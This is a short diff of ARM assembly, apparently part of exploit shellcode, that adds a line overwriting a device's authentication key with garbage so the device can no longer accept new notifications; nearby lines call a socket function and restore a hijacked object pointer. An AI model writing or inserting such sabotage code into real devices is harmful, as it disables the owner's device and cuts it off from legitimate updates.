@@ -49,6 +49,8 @@ start:
 	mov     r1, r7          @ socket
 	blx		r5
 
+	str		r5, [r4, #24]	@ overwrite auth key by some garbage, so device will never take new notications
+
 	add		sp, #300
 	sub 	r4, #252 		@ restore previous this - address of Context
 
